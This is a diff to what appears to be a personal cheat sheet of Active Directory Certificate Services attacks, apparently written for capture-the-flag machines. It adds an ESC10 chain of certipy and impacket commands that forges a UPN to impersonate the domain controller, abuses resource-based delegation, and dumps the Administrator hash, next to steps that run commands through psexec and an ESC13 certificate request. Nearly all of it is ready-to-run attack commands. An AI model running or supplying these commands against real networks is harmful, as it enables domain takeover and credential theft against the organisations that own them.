@@ -704,6 +704,15 @@ certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -retrieve ''
 certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'administrator.pfx'
 kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
 
++---------- ESC10 ----------+
+certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'DC01$@$DOM'
+certipy req -k -dc-ip $IP -target $DC -ca $CA -template 'User'
+certipy account update -k -target $DC -dc-ip $TARGET -user 'WRITEABLE_UPN' -upn 'ORIGINAL_UPN@$DOM'
+certipy auth -pfx DC01.pfx -dc-ip $IP -ldap-shell
+set_rbcd DC01$ WRITEABLE_OWNER_USER
+impacket-getST -k -no-pass -dc-ip $IP $DOM/'WRITEABLE_OWNER_USER' -spn 'cifs/DC01.mirage.htb' -impersonate DC01$
+impacket-secretsdump -k -no-pass $DC -just-dc-user Administrator
+
 +---------- ESC13 ----------+
 certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'VulnerableTemplate' -upn 'NEW_UPN' -key-size 4096
 certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
